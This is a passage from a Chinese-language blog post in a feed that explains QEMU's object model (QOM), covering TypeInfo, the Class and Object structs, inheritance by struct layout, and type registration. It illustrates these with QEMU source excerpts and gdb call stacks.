      <link href="/2024/04/08/qemu%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/04/08/qemu%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这里简单介绍一些<strong>QEMU</strong>相关的基本知识，从而方便后续更深入的研究<strong>QEMU</strong></p><h1 id="QOM-QEMU-Object-Model"><a href="#QOM-QEMU-Object-Model" class="headerlink" title="QOM(QEMU Object Model)"></a>QOM(QEMU Object Model)</h1><p><strong>QEMU</strong>提供了一套面向对象编程的模型，从而实现各种具有继承关系的设备的模拟。</p><p>面向对象编程通常涵盖了<strong>类</strong>和<strong>对象</strong>这两个关键概念，其中<strong>类</strong>是<strong>对象</strong>的抽象定义，而<strong>对象</strong>则是<strong>类</strong>的具体实例。在<strong>QOM</strong>中，这些概念得到了实现和体现。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> struct OjbectProperty</span><br><span class="line">    ┌────────────┐</span><br><span class="line">    │            │</span><br><span class="line">    └─────▲──────┘</span><br><span class="line">          │          ┌──┬──────────────┬──┐</span><br><span class="line">          │          │  │    class     ├──┼──────►┌──┬──────────────┬──┐</span><br><span class="line">          │          │  ├──────────────┤  │       │  │    type      ├──┼────►┌──────────────┐</span><br><span class="line">◄─────────┴──────────┼──┤  properties  │  │       │  ├──────────────┤  │     │              ◄─────┐</span><br><span class="line">                     │  ├──────────────┤  │   ┌───┼──┤  properties  │  │     └──────────────┘     │</span><br><span class="line">                     │  │    ...       │  │   │   │  ├──────────────┤  │     struct TypeImpl      │</span><br><span class="line">                     │  └──────────────┘  │   │   │  │    ...       │  │                          │</span><br><span class="line">                     │    parent_obj      │   │   │  └──────────────┘  │                          │</span><br><span class="line">                     ├────────────────────┤   │   │    parent_class    │      ┌───────────────┐   │</span><br><span class="line">                     │       ......       │   │   ├────────────────────┤      │               │   │</span><br><span class="line">                     └────────────────────┘   │   │       ......       │      └───────────────┘   │</span><br><span class="line">                       struct DeviceState     │   └────────────────────┘       struct TypeInfo────┘</span><br><span class="line">                                              │     struct DeviceClass</span><br><span class="line">                                              │</span><br><span class="line">                                              │</span><br><span class="line">                                              │</span><br><span class="line">                                              │    struct OjbectProperty</span><br><span class="line">                                              │       ┌────────────┐</span><br><span class="line">                                              ├──────►│            │</span><br><span class="line">                                              │       └────────────┘</span><br><span class="line">                                              ▼</span><br></pre></td></tr></table></figure></p><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p><strong>QOM</strong>使用<strong>struct TypeInfo</strong>和<strong>Class</strong>结构体类型共同描述一个类。</p><p>其中<strong>struct TypeInfo</strong>描述类的基本属性，<strong>Class</strong>结构体类型描述静态成员。</p><h3 id="struct-TypeInfo"><a href="#struct-TypeInfo" class="headerlink" title="struct TypeInfo"></a>struct TypeInfo</h3><p><strong>QOM</strong>中使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/qom/object.h#L474"><strong>struct TypeInfo</strong></a>描述诸如类的名称、父类名称、实例大小和静态成员情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct TypeInfo:</span></span><br><span class="line"><span class="comment"> * @name: The name of the type.</span></span><br><span class="line"><span class="comment"> * @parent: The name of the parent type.</span></span><br><span class="line"><span class="comment"> * @instance_size: The size of the object (derivative of #Object).  If</span></span><br><span class="line"><span class="comment"> *   @instance_size is 0, then the size of the object will be the size of the</span></span><br><span class="line"><span class="comment"> *   parent object.</span></span><br><span class="line"><span class="comment"> * @instance_align: The required alignment of the object.  If @instance_align</span></span><br><span class="line"><span class="comment"> *   is 0, then normal malloc alignment is sufficient; if non-zero, then we</span></span><br><span class="line"><span class="comment"> *   must use qemu_memalign for allocation.</span></span><br><span class="line"><span class="comment"> * @instance_init: This function is called to initialize an object.  The parent</span></span><br><span class="line"><span class="comment"> *   class will have already been initialized so the type is only responsible</span></span><br><span class="line"><span class="comment"> *   for initializing its own members.</span></span><br><span class="line"><span class="comment"> * @instance_post_init: This function is called to finish initialization of</span></span><br><span class="line"><span class="comment"> *   an object, after all @instance_init functions were called.</span></span><br><span class="line"><span class="comment"> * @instance_finalize: This function is called during object destruction.  This</span></span><br><span class="line"><span class="comment"> *   is called before the parent @instance_finalize function has been called.</span></span><br><span class="line"><span class="comment"> *   An object should only free the members that are unique to its type in this</span></span><br><span class="line"><span class="comment"> *   function.</span></span><br><span class="line"><span class="comment"> * @abstract: If this field is true, then the class is considered abstract and</span></span><br><span class="line"><span class="comment"> *   cannot be directly instantiated.</span></span><br><span class="line"><span class="comment"> * @class_size: The size of the class object (derivative of #ObjectClass)</span></span><br><span class="line"><span class="comment"> *   for this object.  If @class_size is 0, then the size of the class will be</span></span><br><span class="line"><span class="comment"> *   assumed to be the size of the parent class.  This allows a type to avoid</span></span><br><span class="line"><span class="comment"> *   implementing an explicit class type if they are not adding additional</span></span><br><span class="line"><span class="comment"> *   virtual functions.</span></span><br><span class="line"><span class="comment"> * @class_init: This function is called after all parent class initialization</span></span><br><span class="line"><span class="comment"> *   has occurred to allow a class to set its default virtual method pointers.</span></span><br><span class="line"><span class="comment"> *   This is also the function to use to override virtual methods from a parent</span></span><br><span class="line"><span class="comment"> *   class.</span></span><br><span class="line"><span class="comment"> * @class_base_init: This function is called for all base classes after all</span></span><br><span class="line"><span class="comment"> *   parent class initialization has occurred, but before the class itself</span></span><br><span class="line"><span class="comment"> *   is initialized.  This is the function to use to undo the effects of</span></span><br><span class="line"><span class="comment"> *   memcpy from the parent class to the descendants.</span></span><br><span class="line"><span class="comment"> * @class_data: Data to pass to the @class_init,</span></span><br><span class="line"><span class="comment"> *   @class_base_init. This can be useful when building dynamic</span></span><br><span class="line"><span class="comment"> *   classes.</span></span><br><span class="line"><span class="comment"> * @interfaces: The list of interfaces associated with this type.  This</span></span><br><span class="line"><span class="comment"> *   should point to a static array that&#x27;s terminated with a zero filled</span></span><br><span class="line"><span class="comment"> *   element.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> instance_size;</span><br><span class="line">    <span class="type">size_t</span> instance_align;</span><br><span class="line">    <span class="type">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="type">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="type">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> abstract;</span><br><span class="line">    <span class="type">size_t</span> class_size;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> *class_data;</span><br><span class="line"></span><br><span class="line">    InterfaceInfo *interfaces;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Class结构体"><a href="#Class结构体" class="headerlink" title="Class结构体"></a>Class结构体</h3><p><strong>QOM</strong>使用用户自定义的<strong>Class</strong>结构体描述诸如函数表、静态成员等类的静态内容，因此所有的对象只能共享一份<strong>Class</strong>结构体和<strong>struct TypeInfo</strong>数据。</p><p>考虑到类会继承父类的成员内容，因此需要在<strong>Class</strong>结构体中包含父类的<strong>Class</strong>数据来实现继承关系。同时为了能安全的实现面向对象编程中的向上转型，总是将父类的数据放在<strong>Class</strong>结构体的最开始，如<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/hw/pci/pci_device.h#L24"><strong>struct PCIDeviceClass</strong></a>所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ┌─┬─┬────────────┬─┬─┐ 0│</span></span><br><span class="line"><span class="comment"> * │ │ │ObjectClass │ │ │  │</span></span><br><span class="line"><span class="comment"> * │ │ └────────────┘ │ │  │offset</span></span><br><span class="line"><span class="comment"> * │ │   DeviceClass  │ │  │</span></span><br><span class="line"><span class="comment"> * │ └────────────────┘ │  │</span></span><br><span class="line"><span class="comment"> * │   PCIDeviceClass   │  │</span></span><br><span class="line"><span class="comment"> * └────────────────────┘  ▼</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    Type type;</span><br><span class="line">    GSList *interfaces;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line"></span><br><span class="line">    ObjectUnparent *unparent;</span><br><span class="line"></span><br><span class="line">    GHashTable *properties;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DeviceClass</span> &#123;</span></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    ObjectClass parent_class;</span><br><span class="line">    <span class="comment">/* public: */</span></span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIDeviceClass</span> &#123;</span></span><br><span class="line">    DeviceClass parent_class;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p><strong>QOM</strong>使用用户自定义的<strong>Object</strong>结构体描述非静态成员，也就是对象的数据，因此所有的对象都有自己的<strong>Object</strong>结构数据。</p><p>类似于<strong>Class</strong>结构体，考虑到对象同样会继承父类对象的成员内容，因此需要在<strong>Object</strong>结构体中包含父类的<strong>Object</strong>数据来实现继承，父类的数据同样应放在<strong>Object</strong>结构体的最开始以实现向上转型，如<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/hw/pci/pci_device.h#L56"><strong>struct PCIDevice</strong></a>所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ┌─┬──┬────────┬─┬─┐ 0│</span></span><br><span class="line"><span class="comment"> * │ │  │ Object │ │ │  │</span></span><br><span class="line"><span class="comment"> * │ │  └────────┘ │ │  │offset</span></span><br><span class="line"><span class="comment"> * │ │ DeviceState │ │  │</span></span><br><span class="line"><span class="comment"> * │ └─────────────┘ │  │</span></span><br><span class="line"><span class="comment"> * │    PCIDevice    │  │</span></span><br><span class="line"><span class="comment"> * └─────────────────┘  ▼</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    ObjectFree *<span class="built_in">free</span>;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">    <span class="type">uint32_t</span> ref;</span><br><span class="line">    Object *parent;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DeviceState</span> &#123;</span></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line">    <span class="comment">/* public: */</span></span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIDevice</span> &#123;</span></span><br><span class="line">    DeviceState qdev;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><h3 id="类的初始化"><a href="#类的初始化" class="headerlink" title="类的初始化"></a>类的初始化</h3><p>根据<a href="#类">前面章节</a>的介绍，<strong>QOM</strong>使用<strong>struct TypeInfo</strong>和<strong>Class</strong>结构体共同来描述类，类的初始化也就是这两个数据的初始化，包括如下几个步骤</p><ul><li><p>注册类</p><p>  <strong>QOM</strong>使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/qemu/module.h#L56"><strong>type_init</strong></a>宏注册类信息，如下所示</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * #0  register_module_init (fn=0x555555a9b5a8 &lt;pci_register_types&gt;, type=MODULE_INIT_QOM) at ../../qemu/util/module.c:75</span></span><br><span class="line"><span class="comment"> * #1  0x0000555555a9b63c in do_qemu_init_pci_register_types () at ../../qemu/hw/pci/pci.c:2851</span></span><br><span class="line"><span class="comment"> * #2  0x00007ffff7829ebb in call_init (env=&lt;optimized out&gt;, argv=0x7fffffffdc58, argc=29) at ../csu/libc-start.c:145</span></span><br><span class="line"><span class="comment"> * #3  __libc_start_main_impl (main=0x555555e92809 &lt;main&gt;, argc=29, argv=0x7fffffffdc58, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdc48) at ../csu/libc-start.c:379</span></span><br><span class="line"><span class="comment"> * #4  0x000055555586ba15 in _start ()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> type_init(function) module_init(function, MODULE_INIT_QOM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This should not be used directly.  Use block_init etc. instead.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> module_init(function, type)                                         \</span></span><br><span class="line"><span class="meta">static void __attribute__((constructor)) do_qemu_init_ ## function(void)    \</span></span><br><span class="line"><span class="meta">&#123;                                                                           \</span></span><br><span class="line"><span class="meta">    register_module_init(function, type);                                   \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_module_init</span><span class="params">(<span class="type">void</span> (*fn)(<span class="type">void</span>), module_init_type type)</span></span><br><span class="line">&#123;</span><br><span class="line">    ModuleEntry *e;</span><br><span class="line">    ModuleTypeList *l;</span><br><span class="line"></span><br><span class="line">    e = g_malloc0(<span class="keyword">sizeof</span>(*e));</span><br><span class="line">    e-&gt;init = fn;</span><br><span class="line">    e-&gt;type = type;</span><br><span class="line"></span><br><span class="line">    l = find_type(type);</span><br><span class="line"></span><br><span class="line">    QTAILQ_INSERT_TAIL(l, e, node);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo pci_device_type_info = &#123;</span><br><span class="line">    .name = TYPE_PCI_DEVICE,</span><br><span class="line">    .parent = TYPE_DEVICE,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(PCIDevice),</span><br><span class="line">    .abstract = <span class="literal">true</span>,</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(PCIDeviceClass),</span><br><span class="line">    .class_init = pci_device_class_init,</span><br><span class="line">    .class_base_init = pci_device_class_base_init,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_register_types</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    type_register_static(&amp;pci_device_type_info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type_init(pci_register_types)</span><br></pre></td></tr></table></figure><p>  可以看到，<strong>QOM</strong>通过<code>__attribute((constructor))</code>标记让<code>do_qemu_init_X()</code>函数在<code>main()</code>函数之前运行。而<code>do_qemu_init_X()</code>函数是将用户自定义函数(这里是<code>pci_register_types()</code>函数)插入到<code>init_type_list[MODULE_INIT_QOM]</code>链表上</p></li><li><p>生成<strong>struct TypeImpl</strong></p><p>  在<code>main()</code>中，<code>init_type_list[MODULE_INIT_QOM]</code>链表上所有的之前插入的用户自定义函数都会在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/util/module.c#L97"><strong>module_call_init()</strong></a>中执行，调用栈如下所示</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * #0  type_register_static (info=0x555556ea5540 &lt;pci_device_type_info&gt;) at ../../qemu/qom/object.c:195</span></span><br><span class="line"><span class="comment"> * #1  0x0000555555a9b619 in pci_register_types () at ../../qemu/hw/pci/pci.c:2848</span></span><br><span class="line"><span class="comment"> * #2  0x00005555560b0d54 in module_call_init (type=MODULE_INIT_QOM) at ../../qemu/util/module.c:109</span></span><br><span class="line"><span class="comment"> * #3  0x0000555555bd3ce4 in qemu_init_subsystems () at ../../qemu/system/runstate.c:818</span></span><br><span class="line"><span class="comment"> * #4  0x0000555555bdb08b in qemu_init (argc=29, argv=0x7fffffffdc58) at ../../qemu/system/vl.c:2786</span></span><br><span class="line"><span class="comment"> * #5  0x0000555555e9282d in main (argc=29, argv=0x7fffffffdc58) at ../../qemu/system/main.c:47</span></span><br><span class="line"><span class="comment"> * #6  0x00007ffff7829d90 in __libc_start_call_main (main=main@entry=0x555555e92809 &lt;main&gt;, argc=argc@entry=29, argv=argv@entry=0x7fffffffdc58) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment"> * #7  0x00007ffff7829e40 in __libc_start_main_impl (main=0x555555e92809 &lt;main&gt;, argc=29, argv=0x7fffffffdc58, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdc48) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment"> * #8  0x000055555586ba15 in _start ()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>  用户自定义函数通过<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/qom/object.c#L193"><strong>type_register_static()</strong></a>生成<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/qom/object.c#L49"><strong>struct TypeImpl</strong></a>数据，并将其插入到一个全局<strong>GHashTable</strong>中，如下所示。随后可以通过类的名称调用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/qom/object.c#L99"><strong>type_table_lookup</strong></a>获取<strong>struct TypeImpl</strong>数据，<strong>struct TypeImpl</strong>数据包含了<strong>struct TypeInfo</strong>数据和<strong>Class</strong>结构体数据(此时还未初始化)，也就是类的全部信息。</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * #0  type_register_internal (info=0x555556ea5540 &lt;pci_device_type_info&gt;) at ../../qemu/qom/object.c:176</span></span><br><span class="line"><span class="comment"> * #1  0x0000555555e9df0a in type_register (info=0x555556ea5540 &lt;pci_device_type_info&gt;) at ../../qemu/qom/object.c:190</span></span><br><span class="line"><span class="comment"> * #2  0x0000555555e9df30 in type_register_static (info=0x555556ea5540 &lt;pci_device_type_info&gt;) at ../../qemu/qom/object.c:195</span></span><br><span class="line"><span class="comment"> * #3  0x0000555555a9b619 in pci_register_types () at ../../qemu/hw/pci/pci.c:2848</span></span><br><span class="line"><span class="comment"> * #4  0x00005555560b0d54 in module_call_init (type=MODULE_INIT_QOM) at ../../qemu/util/module.c:109</span></span><br><span class="line"><span class="comment"> * #5  0x0000555555bd3ce4 in qemu_init_subsystems () at ../../qemu/system/runstate.c:818</span></span><br><span class="line"><span class="comment"> * #6  0x0000555555bdb08b in qemu_init (argc=29, argv=0x7fffffffdc58) at ../../qemu/system/vl.c:2786</span></span><br><span class="line"><span class="comment"> * #7  0x0000555555e9282d in main (argc=29, argv=0x7fffffffdc58) at ../../qemu/system/main.c:47</span></span><br><span class="line"><span class="comment"> * #8  0x00007ffff7829d90 in __libc_start_call_main (main=main@entry=0x555555e92809 &lt;main&gt;, argc=argc@entry=29, argv=argv@entry=0x7fffffffdc58) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment"> * #9  0x00007ffff7829e40 in __libc_start_main_impl (main=0x555555e92809 &lt;main&gt;, argc=29, argv=0x7fffffffdc58, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdc48) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment"> * #10 0x000055555586ba15 in _start ()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> TypeImpl *<span class="title function_">type_register_internal</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span></span><br><span class="line">&#123;</span><br><span class="line">    TypeImpl *ti;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!type_name_is_valid(info-&gt;name)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Registering &#x27;%s&#x27; with illegal type name\n&quot;</span>, info-&gt;name);</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ti = type_new(info);</span><br><span class="line"></span><br><span class="line">    type_table_add(ti);</span><br><span class="line">    <span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">type_table_add</span><span class="params">(TypeImpl *ti)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(!enumerating_types);</span><br><span class="line">    g_hash_table_insert(type_table_get(), (<span class="type">void</span> *)ti-&gt;name, ti);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> GHashTable *<span class="title function_">type_table_get</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> GHashTable *type_table;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (type_table == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        type_table = g_hash_table_new(g_str_hash, g_str_equal);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> type_table;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeImpl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> class_size;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> instance_size;</span><br><span class="line">    <span class="type">size_t</span> instance_align;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *class_data;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span 